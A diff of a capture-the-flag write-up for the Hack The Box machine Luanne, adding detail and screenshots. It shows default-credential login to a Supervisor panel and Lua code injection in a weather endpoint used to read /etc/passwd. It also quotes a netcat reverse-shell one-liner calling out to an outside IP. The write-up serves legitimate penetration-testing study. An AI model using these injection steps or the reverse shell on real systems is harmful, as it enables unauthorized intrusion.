@@ -85,7 +85,7 @@ There was only one disallow line in `robots.txt` that showed a directory called 
 
 ![](../../.gitbook/assets/3-weather.png)
 
-This did not reveal anything interesting, however.  I left `dirbuster` running while I checked out the next service.
+This did not reveal anything interesting, however.  I left `dirbuster` running while I checked out the next service.  I searched for exploits related to this version of `nginx` but only found a few denial of service vulnerabilities and a CNAME leakage.  There was nothing useful.
 
 ### Port 9001 - HTTP
 
@@ -95,9 +95,15 @@ Navigating to the page hosted on port 9001 also gave me a Basic HTTP authenticat
 
 * [https://readthedocs.org/projects/supervisor/downloads/pdf/latest/](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)
 
+![](../../.gitbook/assets/5-default.png)
+
 default seemed to be user:123 from the manual \(though it specifies none:none\)
 
+![](../../.gitbook/assets/6-supervisor-status.png)
+
 after logging in I had a supervisor-status page that showed what appeared to be running processes on the server
+
+![](../../.gitbook/assets/7.5-processes.png)
 
 ```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
@@ -126,15 +132,41 @@ root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/
 
 I saw a cron in the process output, as well as a weather.lua
 
+![](../../.gitbook/assets/8-no-exec.png)
+
+I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.
+
+### Port 80 - `/weather/forecast`
+
+![](../../.gitbook/assets/9.5-weather-forecast.png)
+
 /forecast from dirbuster
+
+![](../../.gitbook/assets/9-weather-forecast.png)
 
 "No city specified. Use 'city=list' to list available cities."
 
+![](../../.gitbook/assets/10-weather-test.png)
+
+test showed unknown city error
+
+![](../../.gitbook/assets/11-lua-error.png)
+
+Sending a query of `'` \(single quote\) resulted in a "nil" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.
+
 * [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)
 
-ending the query in `'` resulted in "nil" lua error. had to close off the function parameters with `)`
+![](../../.gitbook/assets/12-noscript-xss-warning.png)
 
-using lua comment `--` at the end closed off the insertion and enabled command execution
+My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')` and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.
+
+![](../../.gitbook/assets/12-lua-code-exec.png)
+
+ Looking a bit closer at my attempt, I noticed that I had typed `os.system('id')` rather than `os.execute('id')` which NoScript saw as JavaScript, triggering that warning.  Fixing this error allowed me to get command execution. 
+
+{% hint style="info" %}
+NoScript still caught the attempt using **`os.execute`**, but at least it drew my attention to my error the first time!
+{% endhint %}
 
 ```bash
 root:*:0:0:Charlie &:/root:/bin/sh
@@ -167,13 +199,19 @@ nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
 dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
 ```
 
-Got `/etc/passwd`
+Using this command execution I pulled `/etc/passwd` to enumerate the users on the machine.  There were only two users who could login with a shell, `root` and `r.michaels`.  
 
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md\#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
+```text
+NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
+```
+
+The command `uname -a` revealed this to be a NetBSD system.  I wasn't sure what kind of reverse shell would work on a BSD system, so I checked the one-stop-shop for all things Payload.
+
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md\#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
 
 > `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
 
-reverse shell with nc \(without -e\) for openbsd
+I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.
 
 ## Initial Foothold
 
@@ -192,7 +230,7 @@ uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
 luanne.htb
 ```
 
-worked!
+It worked!
 
 ### Enumeration as `_httpd`
 
